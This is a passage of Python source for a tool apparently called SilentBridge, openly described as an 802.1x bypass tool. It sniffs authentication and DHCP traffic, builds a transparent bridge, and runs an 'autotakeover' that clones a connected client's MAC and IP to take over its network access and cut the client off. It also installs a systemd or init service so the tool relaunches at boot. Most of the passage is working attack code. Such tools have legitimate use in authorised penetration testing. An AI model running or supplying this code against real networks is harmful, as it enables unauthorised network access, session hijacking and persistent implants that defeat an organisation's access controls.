                config['upstream_interface'] = list(network_side_interfaces)[0]
                print(f"[*] Determined network interface (upstream): {config['upstream_interface']}")
        
        # If we have client interface but not upstream, and we have exactly two interfaces,
        # assume the other one is upstream
        if config['phy_interface'] is not None and config['upstream_interface'] is None:
            available_interfaces = set(self.args.interfaces)
            if len(available_interfaces) == 2:
                other_interfaces = available_interfaces - {config['phy_interface']}
                if len(other_interfaces) == 1:
                    config['upstream_interface'] = list(other_interfaces)[0]
                    print(f"[*] Inferred network interface (upstream): {config['upstream_interface']}")
        
        # Similarly, if we have upstream but not client interface
        if config['upstream_interface'] is not None and config['phy_interface'] is None:
            available_interfaces = set(self.args.interfaces)
            if len(available_interfaces) == 2:
                other_interfaces = available_interfaces - {config['upstream_interface']}
                if len(other_interfaces) == 1:
                    config['phy_interface'] = list(other_interfaces)[0]
                    print(f"[*] Inferred client interface (phy): {config['phy_interface']}")
        
        return config

    def analyze_network(self):
        """Analyze network interfaces to determine configuration"""
        print("[*] Starting network analysis...")
        
        # Check if interfaces exist
        for iface in self.args.interfaces:
            if not self.check_interface_exists(iface):
                print(f"[!] Interface {iface} does not exist!")
                return
        
        print("[*] Interfaces to analyze:")
        for iface in self.args.interfaces:
            try:
                mac = netifaces.ifaddresses(iface)[netifaces.AF_LINK][0]['addr']
                print(f"  - {iface} (MAC: {mac})")
            except:
                print(f"  - {iface} (MAC: unknown)")
        
        # Start packet capture on all interfaces
        print("[*] Starting packet capture on all interfaces...")
        threads = []
        for iface in self.args.interfaces:
            thread = Thread(target=lambda iface=iface: sniff(
                iface=iface,
                prn=self.packet_callback,
                store=0,
                stop_filter=lambda _: self.stop_sniffing.is_set()
            ))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        print("[*] Listening for authentication and DHCP packets...")
        print("[*] Looking for:")
        print("  - EAPOL Start packets (from client)")
        print("  - EAP Identity Request packets (from network)")
        print("  - DHCP Discover/Request packets (from client)")
        print("  - DHCP Offer/ACK packets (from network)")
        print(f"[*] Analysis will timeout in {self.args.timeout} seconds")
        print("[*] Please initiate 802.1x authentication or DHCP request on the client...")
        
        # Analyze packets
        config = self.analyze_packets(self.args.timeout)
        
        # Stop packet capture
        self.stop_sniffing.set()
        for thread in threads:
            thread.join()
        
        # Print results
        print("\n[+] Analysis complete!")
        print("\nDetected Network Configuration:")
        print("------------------------------")
        
        # Client side information
        print("\nClient Side:")
        if config['phy_interface']:
            print(f"  Interface: {config['phy_interface']}")
        else:
            print("  Interface: [!] Could not determine client interface")
        
        if config['client_mac']:
            print(f"  MAC Address: {config['client_mac']}")
        else:
            print("  MAC Address: [!] Could not determine client MAC address")
        
        if config['client_ip']:
            print(f"  IP Address: {config['client_ip']}")
        else:
            print("  IP Address: [!] Could not determine client IP address")
        
        # Network side information
        print("\nNetwork Side:")
        if config['upstream_interface']:
            print(f"  Interface: {config['upstream_interface']}")
        else:
            print("  Interface: [!] Could not determine upstream interface")
        
        if config['router_mac']:
            print(f"  Gateway MAC: {config['router_mac']}")
        else:
            print("  Gateway MAC: [!] Could not determine gateway MAC address")
        
        if config['router_ip']:
            print(f"  Gateway IP: {config['router_ip']}")
        else:
            print("  Gateway IP: [!] Could not determine gateway IP address")
        
        # Provide recommendations based on analysis results
        print("\nRecommendations:")
        if config['phy_interface'] and config['upstream_interface']:
            print(f"[+] Create a bridge with: --phy {config['phy_interface']} --upstream {config['upstream_interface']}")
        else:
            if not config['phy_interface']:
                print("[!] Could not determine client interface. Try manually specifying --phy.")
            if not config['upstream_interface']:
                print("[!] Could not determine upstream interface. Try manually specifying --upstream.")
        
        # Save configuration
        if any(v is not None for v in config.values()):
            print("\n[*] Saving configuration...")
            self.save_config(config)
            print(f"[+] Configuration saved to {self.config_file}")
            print("[*] You can use this configuration with --use-stored-config")
        else:
            print("\n[!] No configuration detected to save")
        
        return config

    def check_network_stack(self):
        """Detect available networking tools and stack"""
        tools = {
            'networkmanager': self.check_command_exists('nmcli'),
            'ip': self.check_command_exists('ip'),
            'ifconfig': self.check_command_exists('ifconfig'),
            'brctl': self.check_command_exists('brctl'),
            'bridge': self.check_command_exists('bridge')  # Modern bridge command
        }
        return tools

    def handle_networkmanager_interface(self, interface, action='unmanage'):
        """Handle NetworkManager interface management
        action: 'unmanage' or 'manage'
        """
        if not self.network_stack['networkmanager']:
            return False
            
        try:
            if action == 'unmanage':
                # First check if interface is managed by NetworkManager using shell=True
                result = self.run_command(f"nmcli device status | grep {interface}", shell=True)
                if not result or 'unmanaged' in result:
                    return True
                    
                print(f"[*] Removing {interface} from NetworkManager control...")
                self.run_command(f"nmcli device set {interface} managed no")
                
                # Wait for NetworkManager to release the interface
                time.sleep(2)
                return True
                
            elif action == 'manage':
                print(f"[*] Returning {interface} to NetworkManager control...")
                self.run_command(f"nmcli device set {interface} managed yes")
                return True
                
        except Exception as e:
            print(f"[!] Error handling NetworkManager for {interface}: {e}")
            return False

    def reset_interface(self, interface):
        """Reset an interface to a clean state"""
        try:
            # Remove from NetworkManager if present first
            if self.network_stack['networkmanager']:
                self.handle_networkmanager_interface(interface, 'unmanage')
            
            # Bring interface down
            if self.network_stack['ip']:
                self.run_command(f"ip link set {interface} down", ignore_errors=True)
            else:
                self.run_command(f"ifconfig {interface} down", ignore_errors=True)
            
            # Flush IP addresses
            if self.network_stack['ip']:
                self.run_command(f"ip addr flush dev {interface}", ignore_errors=True)
            
            # Reset interface flags
            self.run_command(f"ip link set {interface} promisc off", ignore_errors=True)
            
            # Bring interface back up for packet capture
            if self.network_stack['ip']:
                self.run_command(f"ip link set {interface} up", ignore_errors=True)
            else:
                self.run_command(f"ifconfig {interface} up", ignore_errors=True)
            
            # Small delay to ensure interface is up
            time.sleep(1)
            
            return True
        except Exception as e:
            print(f"[!] Error resetting interface {interface}: {e}")
            return False

    def cleanup_autotakeover(self):
        """Clean up after failed autotakeover"""
        print("[*] Cleaning up...")
        
        # Destroy bridge if it exists
        if self.check_interface_exists(self.args.bridge):
            self.destroy_bridge()
        
        # Reset interfaces
        for iface in self.args.interfaces:
            self.reset_interface(iface)
            if self.network_stack['networkmanager']:
                self.handle_networkmanager_interface(iface, 'manage')
                self.run_command(f"nmcli device connect {iface}", ignore_errors=True)
            else:
                if self.network_stack['ip']:
                    self.run_command(f"ip link set {iface} up", ignore_errors=True)
                else:
                    self.run_command(f"ifconfig {iface} up", ignore_errors=True)

    def autotakeover(self):
        """Automatically analyze, bridge and takeover client connection"""
        print("[*] Starting autotakeover operation...")
        success = False
        
        try:
            # Check if interfaces exist
            for iface in self.args.interfaces:
                if not self.check_interface_exists(iface):
                    print(f"[!] Interface {iface} does not exist!")
                    return
            
            # Step 1: Reset interfaces to clean state
            print("[*] Step 1: Resetting interfaces to clean state...")
            for iface in self.args.interfaces:
                print(f"[*] Resetting {iface}...")
                if not self.reset_interface(iface):
                    raise Exception(f"Failed to reset interface {iface}")
            
            print("[*] Waiting 5 seconds for interfaces to settle...")
            time.sleep(5)  # Reduced from 10 to 5 since we're already waiting in reset_interface
            
            # Verify interfaces are up before starting capture
            for iface in self.args.interfaces:
                if self.network_stack['ip']:
                    state = self.run_command(f"ip link show {iface}", shell=True)
                    if state and "DOWN" in state:
                        print(f"[*] Bringing up {iface}...")
                        self.run_command(f"ip link set {iface} up", ignore_errors=True)
                        time.sleep(1)
                else:
                    self.run_command(f"ifconfig {iface} up", ignore_errors=True)
                    time.sleep(1)
            
            # Step 2: Analyze network to determine interfaces
            print("[*] Step 2: Analyzing network to determine interface roles...")
            # Create temporary args for analysis
            original_args = self.args
            analysis_args = argparse.Namespace(
                interfaces=self.args.interfaces,
                timeout=self.args.timeout
            )
            self.args = analysis_args
            
            # Clear any existing packets
            while not self.packet_queue.empty():
                self.packet_queue.get()
            
            self.stop_sniffing.clear()
            
            # Start packet capture with error handling
            threads = []
            for iface in self.args.interfaces:
                def sniff_with_retry(iface):
                    while not self.stop_sniffing.is_set():
                        try:
                            sniff(iface=iface,
                                 prn=self.packet_callback,
                                 store=0,
                                 stop_filter=lambda _: self.stop_sniffing.is_set())
                        except OSError as e:
                            if e.errno == 100:  # Network is down
                                print(f"[!] Interface {iface} is down, retrying...")
                                time.sleep(1)
                                continue
                            raise
                
                thread = Thread(target=sniff_with_retry, args=(iface,))
                thread.daemon = True
                thread.start()
                threads.append(thread)
            
            print("[*] Listening for authentication and DHCP packets...")
            print("[*] Please initiate 802.1x authentication or DHCP request on the client...")
            print(f"[*] Analysis will timeout in {self.args.timeout} seconds")
            
            # Analyze packets
            config = self.analyze_packets(self.args.timeout)
            
            # Stop packet capture
            self.stop_sniffing.set()
            for thread in threads:
                thread.join()
            
            # Restore original args
            self.args = original_args
            
            if not config['phy_interface'] or not config['upstream_interface']:
                raise Exception("Could not determine interface roles. Please try manual configuration.")
            
            print(f"[+] Analysis complete! Detected client interface: {config['phy_interface']}, network interface: {config['upstream_interface']}")
            
            # Step 3: Create bridge with analyzed interfaces
            print("[*] Step 3: Creating bridge with detected configuration...")
            bridge_args = argparse.Namespace(
                bridge=self.args.bridge,
                phy=config['phy_interface'],
                upstream=config['upstream_interface'],
                use_legacy=False
            )
            self.args = bridge_args
            self.create_transparent_bridge()
            
            # Step 4: Wait for client authentication and DHCP
            print("[*] Step 4: Waiting for client authentication and DHCP...")
            print("[*] Giving the bridge time to stabilize (10 seconds)...")
            time.sleep(10)
            
            # Update config with client information
            print("[*] Starting second packet capture to obtain client information...")
            self.args = analysis_args
            self.stop_sniffing.clear()
            
            # Clear any existing packets
            while not self.packet_queue.empty():
                self.packet_queue.get()
            
            # Start new packet capture for client info
            threads = []
            for iface in [config['phy_interface'], config['upstream_interface']]:
                def sniff_with_retry(iface):
                    while not self.stop_sniffing.is_set():
                        try:
                            sniff(iface=iface,
                                 prn=self.packet_callback,
                                 store=0,
                                 stop_filter=lambda _: self.stop_sniffing.is_set())
                        except OSError as e:
                            if e.errno == 100:  # Network is down
                                print(f"[!] Interface {iface} is down, retrying...")
                                time.sleep(1)
                                continue
                            raise
                
                thread = Thread(target=sniff_with_retry, args=(iface,))
                thread.daemon = True
                thread.start()
                threads.append(thread)
            
            print("[*] Please initiate 802.1x authentication or DHCP request on the client again...")
            print(f"[*] Analysis will timeout in {self.args.timeout} seconds")
            
            # Analyze packets for client information
            client_config = self.analyze_packets(self.args.timeout)
            
            # Stop packet capture
            self.stop_sniffing.set()
            for thread in threads:
                thread.join()
            
            # Merge configs, preferring the new client info
            for key in ['client_mac', 'client_ip', 'router_mac', 'router_ip']:
                if client_config[key] is not None:
                    config[key] = client_config[key]
            
            if not config['client_mac'] or not config['client_ip']:
                raise Exception("Could not obtain client information. Please try manual configuration.")
            
            print(f"[+] Client information obtained: MAC={config['client_mac']}, IP={config['client_ip']}")
            
            # Step 5: Perform takeover
            print("[*] Step 5: Initiating takeover with obtained configuration...")
            takeover_args = argparse.Namespace(
                bridge=self.args.bridge,
                phy=config['phy_interface'],
                veth_name=self.args.veth_name,
                client_mac=config['client_mac'],
                client_ip=config['client_ip'],
                netmask='255.255.255.0',  # Default netmask
                gateway_ip=config['router_ip'] if config['router_ip'] else None
            )
            
            if not takeover_args.gateway_ip:
                # Try to determine gateway from client IP
                print("[*] Gateway IP not detected, inferring from client IP...")
                ip_parts = config['client_ip'].split('.')
                ip_parts[3] = '1'
                takeover_args.gateway_ip = '.'.join(ip_parts)
                print(f"[*] Using inferred gateway IP: {takeover_args.gateway_ip}")
            
            self.args = takeover_args
            self.takeover_client()
            
            success = True
            print("[+] Autotakeover completed successfully!")
            print(f"[+] The system is now using {self.args.veth_name} with client's MAC and IP.")
            print(f"[+] The client has been disconnected from the network.")
            print("[*] You can now use the network as the client.")
            
        except Exception as e:
            print(f"[!] Error during autotakeover: {e}")
            if not success:
                print("[*] Cleaning up and restoring original state...")
                self.cleanup_autotakeover()
                print("[*] System restored to original state")
        
        finally:
            # Restore original args
            self.args = original_args

    def detect_package_manager(self):
        """Detect the system's package manager"""
        package_managers = {
            'apt': '/usr/bin/apt',
            'yum': '/usr/bin/yum',
            'dnf': '/usr/bin/dnf',
            'pacman': '/usr/bin/pacman',
            'zypper': '/usr/bin/zypper',
            'apk': '/sbin/apk'
        }
        
        for pm, path in package_managers.items():
            if os.path.exists(path):
                return pm
        return None

    def get_package_names(self, package_manager):
        """Get package names for different package managers"""
        packages = {
            'apt': {
                'python3-pip': 'python3-pip',
                'bridge-utils': 'bridge-utils',
                'macchanger': 'macchanger',
                'ethtool': 'ethtool',
                'net-tools': 'net-tools',
                'iptables': 'iptables',
                'ebtables': 'ebtables',
                'arptables': 'arptables'
            },
            'yum': {
                'python3-pip': 'python3-pip',
                'bridge-utils': 'bridge-utils',
                'macchanger': 'macchanger',
                'ethtool': 'ethtool',
                'net-tools': 'net-tools',
                'iptables': 'iptables',
                'ebtables': 'ebtables',
                'arptables': 'arptables'
            },
            'dnf': {
                'python3-pip': 'python3-pip',
                'bridge-utils': 'bridge-utils',
                'macchanger': 'macchanger',
                'ethtool': 'ethtool',
                'net-tools': 'net-tools',
                'iptables': 'iptables',
                'ebtables': 'ebtables',
                'arptables': 'arptables'
            },
            'pacman': {
                'python3-pip': 'python-pip',
                'bridge-utils': 'bridge-utils',
                'macchanger': 'macchanger',
                'ethtool': 'ethtool',
                'net-tools': 'net-tools',
                'iptables': 'iptables',
                'ebtables': 'ebtables',
                'arptables': 'arptables'
            },
            'zypper': {
                'python3-pip': 'python3-pip',
                'bridge-utils': 'bridge-utils',
                'macchanger': 'macchanger',
                'ethtool': 'ethtool',
                'net-tools': 'net-tools',
                'iptables': 'iptables',
                'ebtables': 'ebtables',
                'arptables': 'arptables'
            },
            'apk': {
                'python3-pip': 'py3-pip',
                'bridge-utils': 'bridge-utils',
                'macchanger': 'macchanger',
                'ethtool': 'ethtool',
                'net-tools': 'net-tools',
                'iptables': 'iptables',
                'ebtables': 'ebtables',
                'arptables': 'arptables'
            }
        }
        return packages.get(package_manager, {})

    def get_install_command(self, package_manager):
        """Get the installation command for different package managers"""
        commands = {
            'apt': 'apt-get -y install',
            'yum': 'yum -y install',
            'dnf': 'dnf -y install',
            'pacman': 'pacman -S --noconfirm',
            'zypper': 'zypper -n install',
            'apk': 'apk add'
        }
        return commands.get(package_manager)

    def check_python_package(self, package):
        """Check if a Python package is installed"""
        try:
            __import__(package)
            return True
        except ImportError:
            return False

    def install_tools(self):
        """Check and install required tools"""
        print("[*] Checking for required tools...")
        
        # Check if running as root
        if os.geteuid() != 0:
            print("[!] This command must be run as root!")
            return
        
        # Detect package manager
        package_manager = self.detect_package_manager()
        if not package_manager:
            print("[!] Could not detect package manager!")
            return
        
        print(f"[*] Detected package manager: {package_manager}")
        
        # Get package names for detected package manager
        packages = self.get_package_names(package_manager)
        if not packages:
            print(f"[!] Package manager {package_manager} is not supported!")
            return
        
        # Check which packages are missing
        missing_packages = []
        for tool, package in packages.items():
            if not self.check_command_exists(tool.split('-')[0]):  # Handle cases like python3-pip
                missing_packages.append(package)
        
        # Check Python packages
        python_packages = ['scapy', 'netifaces']
        missing_python_packages = []
        for package in python_packages:
            if not self.check_python_package(package):
                missing_python_packages.append(package)
        
        if not missing_packages and not missing_python_packages:
            print("[+] All required tools are already installed!")
            return
        
        # Print missing packages
        if missing_packages:
            print("\nMissing system packages:")
            for package in missing_packages:
                print(f"  - {package}")
        
        if missing_python_packages:
            print("\nMissing Python packages:")
            for package in missing_python_packages:
                print(f"  - {package}")
        
        # Ask for confirmation
        if not self.args.no_confirm:
            response = input("\nDo you want to install the missing packages? [y/N] ")
            if response.lower() != 'y':
                print("[*] Installation cancelled.")
                return
        
        # Install missing system packages
        if missing_packages:
            print("\n[*] Installing missing system packages...")
            install_cmd = self.get_install_command(package_manager)
            packages_str = ' '.join(missing_packages)
            
            if package_manager == 'pacman':
                # Update package database first for Arch Linux
                self.run_command("pacman -Sy", ignore_errors=True)
            
            result = self.run_command(f"{install_cmd} {packages_str}")
            if result is None:
                print("[!] Failed to install system packages!")
                return
        
        # Install missing Python packages
        if missing_python_packages:
            print("\n[*] Installing missing Python packages...")
            packages_str = ' '.join(missing_python_packages)
            result = self.run_command(f"pip3 install {packages_str}")
            if result is None:
                print("[!] Failed to install Python packages!")
                return
        
        print("\n[+] All required tools have been installed successfully!")

    def configure_autostart(self):
        """Configure SilentBridge to start on boot"""
        if self.args.enable:
            print("[*] Enabling SilentBridge autostart on boot...")
        else:
            print("[*] Disabling SilentBridge autostart on boot...")
        
        # Check if running as root
        if os.geteuid() != 0:
            print("[!] This command must be run as root!")
            return
        
        # Determine init system
        init_system = self.detect_init_system()
        if not init_system:
            print("[!] Could not detect init system!")
            return
        
        print(f"[*] Detected init system: {init_system}")
        
        if self.args.enable:
            # Validate arguments based on command
            if self.args.command == 'create':
                if not self.args.phy or not self.args.upstream:
                    print("[!] For 'create' command, --phy and --upstream arguments are required!")
                    return
            elif self.args.command == 'autotakeover':
                if not self.args.interfaces or len(self.args.interfaces) != 2:
                    print("[!] For 'autotakeover' command, --interfaces argument with two interfaces is required!")
                    return
            
            # Create autostart configuration
            if init_system == 'systemd':
                self.configure_systemd_autostart()
            elif init_system == 'sysvinit':
                self.configure_sysvinit_autostart()
            else:
                print(f"[!] Autostart configuration for {init_system} is not supported!")
                return
        else:
            # Disable autostart
            if init_system == 'systemd':
                self.disable_systemd_autostart()
            elif init_system == 'sysvinit':
                self.disable_sysvinit_autostart()
            else:
                print(f"[!] Autostart configuration for {init_system} is not supported!")
                return
    
    def detect_init_system(self):
        """Detect the system's init system"""
        # Check for systemd
        if os.path.exists('/run/systemd/system'):
            return 'systemd'
        
        # Check for SysVinit
        if os.path.exists('/etc/init.d'):
            return 'sysvinit'
        
        # Check for OpenRC (used by Gentoo, Alpine)
        if os.path.exists('/etc/init.d/openrc'):
            return 'openrc'
        
        return None
    
    def configure_systemd_autostart(self):
        """Configure autostart using systemd"""
        # Create service file
        service_name = 'silentbridge.service'
        service_path = '/etc/systemd/system/' + service_name
        
        # Get script path
        script_path = os.path.abspath(sys.argv[0])
        
        # Build command based on selected command
        if self.args.command == 'create':
            cmd = f"{script_path} create --bridge {self.args.bridge} --phy {self.args.phy} --upstream {self.args.upstream}"
            if getattr(self.args, 'use_legacy', False):
                cmd += " --use-legacy"
        else:  # autotakeover
            cmd = f"{script_path} autotakeover --interfaces {' '.join(self.args.interfaces)} --bridge {self.args.bridge}"
        
        # Create service file content
        service_content = f"""[Unit]
Description=SilentBridge 802.1x Bypass Tool
After=network.target

[Service]
Type=simple
ExecStart={cmd}
Restart=on-failure
RestartSec=5

[Install]
WantedBy=multi-user.target
"""
        
        try:
            # Write service file
            with open(service_path, 'w') as f:
                f.write(service_content)
            
            print(f"[*] Created systemd service file: {service_path}")
            
            # Enable and start the service
            self.run_command(f"systemctl daemon-reload")
            self.run_command(f"systemctl enable {service_name}")
            
            print("[+] SilentBridge autostart has been enabled!")
            print(f"[*] Service will run: {cmd}")
            print("[*] You can manually start it with:")
            print(f"    systemctl start {service_name}")
            
        except Exception as e:
            print(f"[!] Error configuring systemd autostart: {e}")
    
    def disable_systemd_autostart(self):
        """Disable autostart using systemd"""
        service_name = 'silentbridge.service'
        service_path = '/etc/systemd/system/' + service_name
        
        try:
            # Check if service exists
            if not os.path.exists(service_path):
                print("[!] SilentBridge systemd service is not installed!")
                return
            
            # Disable and stop the service
            self.run_command(f"systemctl stop {service_name}", ignore_errors=True)
            self.run_command(f"systemctl disable {service_name}")
            
            # Remove service file
            os.remove(service_path)
            self.run_command(f"systemctl daemon-reload")
            
            print("[+] SilentBridge autostart has been disabled!")
            
        except Exception as e:
            print(f"[!] Error disabling systemd autostart: {e}")
    
    def configure_sysvinit_autostart(self):
        """Configure autostart using SysVinit"""
        # Create init script
        init_script_name = 'silentbridge'
        init_script_path = '/etc/init.d/' + init_script_name
        
        # Get script path
        script_path = os.path.abspath(sys.argv[0])
        
        # Build command based on selected command
        if self.args.command == 'create':
            cmd = f"{script_path} create --bridge {self.args.bridge} --phy {self.args.phy} --upstream {self.args.upstream}"
            if getattr(self.args, 'use_legacy', False):
                cmd += " --use-legacy"
        else:  # autotakeover
            cmd = f"{script_path} autotakeover --interfaces {' '.join(self.args.interfaces)} --bridge {self.args.bridge}"
        
        # Create init script content
        init_script_content = f"""#!/bin/sh
### BEGIN INIT INFO
# Provides:          silentbridge
# Required-Start:    $network $remote_fs $syslog
# Required-Stop:     $network $remote_fs $syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: SilentBridge 802.1x Bypass Tool
# Description:       Starts the SilentBridge 802.1x Bypass Tool
### END INIT INFO

PATH=/sbin:/usr/sbin:/bin:/usr/bin
DESC="SilentBridge 802.1x Bypass Tool"
NAME=silentbridge
DAEMON={cmd}
PIDFILE=/var/run/$NAME.pid

case "$1" in
  start)
    echo "Starting $DESC"
    $DAEMON &
    echo $! > $PIDFILE
    ;;
  stop)
    echo "Stopping $DESC"
    if [ -f $PIDFILE ]; then
        PID=$(cat $PIDFILE)
        kill -TERM $PID
        rm $PIDFILE
    else
        echo "$NAME is not running"
    fi
    ;;
  restart|force-reload)
    $0 stop
    sleep 1
    $0 start
    ;;
  status)
    if [ -f $PIDFILE ]; then
        PID=$(cat $PIDFILE)
        if ps -p $PID > /dev/null; then
            echo "$NAME is running"
            exit 0
        else
            echo "$NAME is not running (stale PID file)"
            exit 1
        fi
    else
        echo "$NAME is not running"
        exit 3
    fi
    ;;
  *)
    echo "Usage: $0 {start|stop|restart|force-reload|status}"
    exit 1
    ;;
esac

exit 0
"""
        
        try:
            # Write init script
            with open(init_script_path, 'w') as f:
                f.write(init_script_content)
            
            # Make it executable
            os.chmod(init_script_path, 0o755)
            
            print(f"[*] Created SysVinit script: {init_script_path}")
            
            # Enable the script
            if os.path.exists('/usr/sbin/update-rc.d'):
                self.run_command(f"update-rc.d {init_script_name} defaults")
            elif os.path.exists('/sbin/chkconfig'):
                self.run_command(f"chkconfig --add {init_script_name}")
                self.run_command(f"chkconfig {init_script_name} on")
            else:
                print("[!] Could not enable init script automatically!")
                print(f"[*] Please manually enable {init_script_path}")
            
            print("[+] SilentBridge autostart has been enabled!")
            print(f"[*] Service will run: {cmd}")
            print("[*] You can manually start it with:")
            print(f"    service {init_script_name} start")
            
        except Exception as e:
            print(f"[!] Error configuring SysVinit autostart: {e}")
    
    def disable_sysvinit_autostart(self):
        """Disable autostart using SysVinit"""
        init_script_name = 'silentbridge'
        init_script_path = '/etc/init.d/' + init_script_name
        
        try:
            # Check if init script exists
            if not os.path.exists(init_script_path):
                print("[!] SilentBridge init script is not installed!")
                return
            
            # Disable the script
            if os.path.exists('/usr/sbin/update-rc.d'):
                self.run_command(f"update-rc.d -f {init_script_name} remove")
            elif os.path.exists('/sbin/chkconfig'):
                self.run_command(f"chkconfig {init_script_name} off")
                self.run_command(f"chkconfig --del {init_script_name}")
            
            # Stop the service
            self.run_command(f"service {init_script_name} stop", ignore_errors=True)
            
            # Remove init script
            os.remove(init_script_path)
            
            print("[+] SilentBridge autostart has been disabled!")
            
        except Exception as e:
            print(f"[!] Error disabling SysVinit autostart: {e}")

if __name__ == "__main__":
    bridge = SilentBridge()
    bridge.run() 